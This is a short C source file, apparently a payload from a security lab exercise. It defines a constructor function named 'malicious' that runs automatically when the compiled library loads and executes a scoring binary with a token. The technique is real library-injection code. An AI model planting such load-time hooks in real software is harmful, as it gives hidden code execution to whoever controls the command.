#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score b9ec6fd1-3678-4b13-857b-b620eaddec9a");
}
